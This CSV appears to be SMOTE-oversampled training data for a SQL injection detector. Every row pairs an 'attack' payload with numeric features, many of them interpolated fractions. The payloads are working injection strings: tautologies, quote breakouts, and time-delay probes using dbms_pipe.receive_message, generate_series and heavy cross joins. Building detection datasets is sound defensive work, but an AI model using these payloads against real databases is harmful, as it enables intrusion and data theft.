id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000374,attack,boolean,"-4889""   )    )    as vvuo where 8060  =  8060 or   (  8459  =  8459  )  *4906--",nearest_attack_euclidean,R000027,0.2521447633915751,80.08052010051266,22.48312060307598,3.4920215671670154,13.563640703588646,24.0,31.51687939692402,11.0,0.16929698996611525,0.29970177740550863,0.3936379179841846,0.13736331464419146,0.0,1.0,3.0,0.0,0.9194798994873368,2.0,0.0,3.9194798994873365,0.0,0.08052010051266334,0.08052010051266345,5.919479899487336,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000375,attack,boolean,"""   )    )    or    (    (   ""x""   )    )     =     (    (   ""x",nearest_attack_euclidean,R000003,0.10487065184660928,63.194158160773284,8.15255284060758,1.5505898696461262,4.013868440055234,0.22189504088375145,45.91678935966859,13.041605320165703,0.06351207567107536,0.002881753777711049,0.7272369520229953,0.2063692185282182,0.0,4.0,0.013868440055234466,0.0,0.013868440055234466,1.0138684400552345,0.0,7.972263119889531,0.02773688011046893,0.0,0.0,1.0416053201657038,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.013868440055234355,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0138684400552345
SMOTE_000376,attack,boolean,"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  'vxqs'  =  'vxqs",nearest_attack_euclidean,R000013,2.314369684902363,139.71133681805216,32.0,3.789402239225797,42.48453472722087,15.548453472722088,55.48453472722087,26.193813890888347,0.30330767966792277,0.11186981421697678,0.39711366207963944,0.18770884403546093,2.1938138908883467,0.0,0.9030930545558268,0.0,0.0,1.5484534727220867,0.0,11.548453472722088,0.0,2.0,1.0,8.451546527277912,0.5484534727220867,0.0,0.45154652727791333,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.5484534727220867,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.5484534727220867
SMOTE_000377,attack,boolean,select * from users where id  =  1 or   (  $+  )    =  1 or 1  =  1 -- 1,nearest_attack_euclidean,R000001,2.6127573147802705,101.88755029367812,26.898376125262363,3.678402543336343,44.62557482069796,9.764681930876222,35.33152902806929,12.165764514034645,0.4166632268966334,0.08851648419569516,0.37001142936534354,0.12480885954232795,0.0,0.0,2.0,0.0,1.0,2.5668470971930706,0.0,3.299458708420788,0.0,0.0,0.8663058056138586,6.133694194386141,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.5668470971930706,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.566847097193071
SMOTE_000378,attack,boolean,"1  )   as wxms where 7272  =  7272 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000024,0.14862390816315602,156.12828944323454,32.06226503976896,4.071661475631177,82.1905544830035,16.0,42.87546992046207,15.062265039768961,0.526224623849409,0.10253206400197085,0.27468408228824825,0.09655922986037188,0.0,0.062265039768961916,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,2.0,5.0,0.0,0.06226503976896186,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000379,attack,boolean,"1 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000056,1.2822535617440147,92.4478980431858,27.579159217274324,3.646175692156331,31.289579608637162,13.0,36.15831843454865,12.0,0.3385378783250025,0.14070253267383062,0.3908803280714771,0.12987926092968982,0.2895796086371618,0.0,1.420840782725676,0.0,1.0,1.0,0.0,6.289579608637162,0.0,1.0,1.0,3.420840782725676,0.289579608637162,0.0,0.710420391362838,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.28957960863716203,0.7104203913628379,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000380,attack,boolean,"1 where 3175  =  3175 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000052,1.2250720032533953,104.12174623077954,30.280436557694884,3.780758540078423,34.280436557694884,18.248698492311814,38.93652386923386,12.656087311538975,0.32994214370815456,0.17325501057323445,0.37461266746094424,0.12219017825766681,0.0,0.0,2.0,0.0,1.0,1.6560873115389767,0.0,6.0,0.0,1.0,1.0,4.656087311538976,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.6560873115389767,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.6560873115389767
SMOTE_000381,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000006,1.031159067551786,86.72885179271039,23.80443873734006,3.389252355357646,20.60887747468012,13.09778063132997,39.022193686700305,14.0,0.23746595910983825,0.15153479125027308,0.4492119655638198,0.16178728407606888,3.6088774746801207,0.0,0.0,0.0,0.0,1.9022193686700302,0.0,5.90221936867003,0.0,1.0,1.2933418939899095,1.9022193686700302,0.9022193686700302,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9022193686700302,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.09778063132996984,0.09778063132996978,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.09778063132997
SMOTE_000382,attack,boolean,"1""  )   as klur where 7046  =  7046 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000021,2.9000690658880806,139.85526807186196,34.68091491017255,3.6631549474943403,39.28946385627607,19.289463856276072,60.49343825151688,20.782902107792946,0.2813926048722205,0.13835858575797472,0.43192028999942755,0.14832851937037717,2.0,2.391451053896473,1.072365964069018,1.0,0.0,2.0,0.0,10.391451053896473,0.927634035930982,0.0,1.0,4.072365964069018,1.0,1.0,0.5361829820345089,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.536182982034509,0.0,1.463817017965491,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000383,attack,boolean,"-1422%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000053,1.6527062816755915,73.67800037083205,22.321999629167962,3.2863646553128487,8.875666234029282,16.0,33.356000741664076,15.446333395138673,0.12256014233877718,0.21751454071093607,0.45020889743458065,0.20971641951570608,0.0,4.0,1.0,0.0,0.4463333951386732,2.0,0.0,4.892666790277347,2.0,0.5536666048613268,0.5536666048613267,3.446333395138673,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000384,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000042,1.272087408793931,104.77307721674141,29.626648372624388,3.539065698202487,32.0,13.0,45.26648372624386,14.506593490497545,0.30674825085835933,0.12461647691120849,0.4308174646085697,0.13781780762186244,1.0,0.0,1.2532967452487724,0.0,1.0,1.0,0.0,8.253296745248772,0.0,1.0,1.0,3.2532967452487727,1.0,0.0,0.6266483726243861,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000385,attack,boolean,1'  )   rlike   (  select   (  case when   (  2671  =  4485  )   then 1 else 0x28 end   )    )    and   (  'ezco' like 'ezco,nearest_attack_euclidean,R000074,0.39282699405230176,125.74691613002433,29.227858625655347,3.587405623133015,46.34178793848302,13.493693688919924,52.569646564138374,13.341787938483023,0.3691662031494675,0.10666547000643994,0.41839642007551675,0.10577190676857584,4.0,0.0,0.03797643760922487,0.0,0.0,1.0379764376092249,0.0,8.07595287521845,0.0,0.0,0.0,1.2278586256553483,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9620235623907751,0.03797643760922484,1.0,0.0,0.0,0.03797643760922481,1.0,0.0379764376092247,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.03797643760922466,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.113929312827675
SMOTE_000386,attack,boolean,"1  )   where 9687  =  9687 and elt  (  9607  =  9432,9432  )  --",nearest_attack_euclidean,R000063,1.2189935651444461,69.28663007850795,25.24391295964893,3.7389037904436564,13.798804159210093,21.9329347197367,24.621956479824465,8.932934719736696,0.19521036561069802,0.31822696574353426,0.35820333580720964,0.12835933283855808,0.0,0.3109782399122326,2.3109782399122327,0.0,0.0,2.0,0.0,3.0,0.0,0.3109782399122326,1.0,4.310978239912233,0.0,0.3109782399122326,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.6890217600877674,0.3109782399122326,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000387,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""gzhp""  =  ""gzhp",nearest_attack_euclidean,R000059,1.4361893129571348,128.8962219129912,30.506296811681345,4.217128853857665,77.31133426102642,4.29874063766373,31.091184463646115,16.194962550654925,0.6001999661481445,0.03331666948765463,0.24097573806476374,0.12550762629943715,0.0,3.0,0.0,0.0,1.0,1.0,0.0,3.5974812753274623,0.0,1.4937031883186558,3.298740637663731,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000388,attack,boolean,"1'||  (  select 'ersu' where 4123  =  4123 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000008,1.185266146148871,157.3387554612494,36.75700145633318,3.975311842253588,48.581754004916235,23.310749635916707,56.68925036408329,28.757001456333178,0.3079125247674251,0.14859116760770008,0.36089483067482475,0.18260147695005005,2.3785007281665886,0.0,2.0,0.0,0.0,2.0,0.0,11.0,0.0,2.0,1.0,11.378500728166589,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.6892503640832943,0.0,1.0,0.0,0.6892503640832943,0.3107496359167057,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.6892503640832945
SMOTE_000389,attack,boolean,"1'  )   where 4297  =  4297 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000041,1.2986364720041381,151.61586553963983,34.31881872561138,4.2347865254390715,74.29704681402845,14.27527490244551,44.36236254877724,18.68118127438862,0.48992576324532877,0.09364443063886968,0.2930171222858549,0.1234126838299466,1.0,0.0,2.0,0.0,1.0,1.6594093628056887,0.0,5.6811812743886225,0.34059063719431126,0.0,3.0,4.659409362805689,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.6594093628056888,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.6594093628056887
SMOTE_000390,attack,boolean,"1  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000034,3.6316940453664057,136.10355287515029,33.377757210247765,3.899266076615883,48.94056248881397,12.70373798292039,50.459252403415924,24.0,0.3542835380314242,0.09540528167743004,0.3728382753685592,0.17747290492258652,1.3777572102477647,0.0,1.0814951931681567,0.0,0.0,0.5407475965840784,0.0,11.0,0.0,2.0,1.0,7.622242789752235,0.45925240341592166,0.0,0.5407475965840783,0.0,0.0,0.5407475965840783,1.0,0.0,0.0,0.0,1.0,0.4592524034159217,0.0,0.0,0.4592524034159218,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9185048068318433
SMOTE_000391,attack,boolean,"1""  )   as klur where 7046  =  7046 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000021,1.9546874123700915,134.9336499026844,35.16018994161064,3.7890532378434028,40.54691992214752,20.546919922147517,54.61327001946312,19.22654003892624,0.29989402193392933,0.1514946219143238,0.4054695520799906,0.14314180407175625,3.2265400389262426,0.6933649902684393,1.3867299805368787,1.0,0.0,2.0,0.0,9.306635009731561,0.6132700194631213,0.0,1.0,4.386729980536879,1.0,0.6933649902684393,0.6933649902684392,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6933649902684393,0.0,1.3066350097315607,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000392,attack,boolean,"1 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  -- dpph",nearest_attack_euclidean,R000014,0.5346756854373143,132.00052533232795,31.85721790461828,4.248922979067381,74.57165371385483,8.857217904618281,33.571653713854836,15.0,0.5649833240254265,0.06707275649381068,0.25426733993576456,0.11367657954499824,0.0,0.1427820953817207,2.0,0.0,1.0,1.0,0.0,4.0,0.14278209538172074,0.0,2.8572179046182793,4.0,0.0,0.1427820953817207,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.1427820953817207,0.8572179046182793,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000393,attack,boolean,"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""hsaw""  =  ""hsaw",nearest_attack_euclidean,R000060,1.0456703852585367,126.99682298709031,31.443738441575626,3.6076857032768053,38.72028071433297,14.610934610393906,54.443738441575626,19.221869220787813,0.30015642912547474,0.11596960805562205,0.43189452207539414,0.15197944074350903,1.6109346103939062,4.0,0.0,0.8054673051969532,0.0,2.0,0.0,9.610934610393906,0.0,0.1945326948030469,1.0,2.805467305196953,0.805467305196953,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000394,attack,boolean,"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp",nearest_attack_euclidean,R000010,1.299579216331116,80.7186689298679,23.140665535066052,3.2234530005513786,15.2813310701321,13.718668929867897,38.85933446493395,12.859334464933948,0.19002711342575598,0.16946024375494115,0.48140582635272255,0.15910681646658031,0.0,4.0,1.0,0.0,0.42966723246697447,1.4296672324669744,0.0,6.0,0.0,0.0,0.0,2.8593344649339487,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000395,attack,boolean,"1'  )   where 4297  =  4297 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000041,0.3662599686211026,152.11522312655816,34.56505149074419,4.288040977448861,74.98512014506977,16.855017163581397,42.710034327162795,17.56505149074419,0.4929055698960268,0.11083696463295784,0.28089668840108084,0.11536077706993453,0.8550171635813968,0.0,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,2.8550171635813966,5.0,0.8550171635813968,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000396,attack,boolean,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000065,3.5610388378852327,98.33723778269112,24.112412594230374,3.2292902258644585,21.872132895767567,13.0,47.15503496230785,16.3100699246157,0.21585251272202677,0.13293538285504017,0.48294146718439135,0.1682706372385417,4.0,0.0,0.0,0.0,0.0,2.0,0.0,7.155034962307851,2.0,0.5775174811539254,0.5775174811539254,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.4224825188460746,0.0,0.4224825188460746,0.0,0.0,0.0,1.5775174811539254,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4224825188460746,0.4224825188460746,2.844965037692149
SMOTE_000397,attack,boolean,-3596   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  3645  =  3645,nearest_attack_euclidean,R000077,0.9401885320670342,168.64100264644202,35.54359894142319,3.94723705929128,58.26159364853914,23.825604234307242,64.28200529288405,22.271799470711596,0.34596134669152734,0.14102269700622955,0.38089104179959615,0.13212491450264696,5.08719788284638,0.0,1.0,0.0,0.0,1.728200529288405,0.0,9.45640105857681,0.0,0.0,0.0,6.728200529288404,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000398,attack,boolean,"1""   )    )     )   and make_set  (  6751  =  8128,8128  )   and    (    (     (  ""uhiy""  =  ""uhiy",nearest_attack_euclidean,R000062,0.8877656942353396,95.9654066291292,24.128031412483946,3.1846418273829187,20.128031412483946,13.0,47.41868760832263,15.41868760832263,0.20949467809057112,0.13561894077386413,0.49435880998176895,0.16052757115379573,0.0,4.0,0.0,0.0,0.29065619583868507,1.709343804161315,0.0,8.0,0.0,0.709343804161315,0.709343804161315,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000399,attack,boolean,"1""   )    )     )   and make_set  (  6751  =  8128,8128  )   and    (    (     (  ""uhiy""  =  ""uhiy",nearest_attack_euclidean,R000062,1.7299782782173154,112.45684130504975,26.642822875573835,3.4545713126733877,29.87124352809871,13.985693725344301,49.314258300459066,19.28564575114767,0.25494310134719955,0.1260893251019039,0.44918575242904574,0.1697818211218508,0.0,4.0,0.0,0.0,0.0,2.0,0.0,8.657129150229533,0.0,1.3285645751147672,1.0,3.971387450688603,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.3285645751147671,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000400,attack,boolean,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj",nearest_attack_euclidean,R000028,0.19693740380579916,91.76807168004657,27.76807168004658,3.6304098530540374,23.826053760034938,15.826053760034936,38.11596415997671,14.0,0.2595804379449229,0.17239473802402036,0.41544984916947714,0.15257497486157953,4.0,0.0,0.9420179200116456,0.0,0.0,1.0579820799883546,0.0,6.0,0.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0579820799883544,0.9420179200116455,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000401,attack,boolean,"1'  )   where 7007  =  7007 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000075,1.7958163167093715,154.06232859687987,35.883287625834626,3.9264887519516587,46.17904097104523,23.52917809354134,56.47082190645865,27.88328762583463,0.29872190939244037,0.15324150892019234,0.36725121436231417,0.18078536732505307,1.941643812917315,0.0,2.0,0.0,0.0,2.0,0.0,11.0,0.0,2.0,1.0,10.941643812917315,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.47082190645865746,0.0,1.0,0.0,0.4708219064586575,0.5291780935413425,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4708219064586574
SMOTE_000402,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   'bhlx' like 'bhlx",nearest_attack_euclidean,R000036,1.719199573626427,132.41928935586847,31.290306989492493,4.0704012209991705,71.90326322521801,6.290306989492494,35.41928935586847,18.80642978528949,0.5480031776927299,0.04664676212418624,0.26418764989993837,0.14116241028314544,3.0,0.0,0.0,0.0,0.7419386021015013,0.0,0.0,5.806429785289491,0.0,4.225815806304504,3.225815806304504,2.2903069894924935,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.2580613978984987,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
